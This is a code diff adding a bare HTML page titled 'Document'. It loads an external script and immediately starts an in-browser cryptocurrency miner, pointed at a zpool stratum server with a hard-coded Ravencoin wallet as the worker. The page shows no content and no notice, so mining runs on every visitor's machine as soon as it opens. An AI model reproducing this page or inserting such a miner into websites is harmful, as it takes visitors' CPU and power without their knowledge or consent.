@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+
+<body>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script src="app.js"></script>
+  <script>
+    const stratum = {
+      server: "minotaurx.na.mine.zpool.ca",
+      port: 7019,
+      worker: "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
+      password: "c=RVN"
+    }
+
+    mine({
+      // required
+      stratum,
+      // optional
+      options: {
+        log: true, // enables/disables logs
+        threads: 1
+      }
+    })
+  </script>
+</body>
+
+</html>
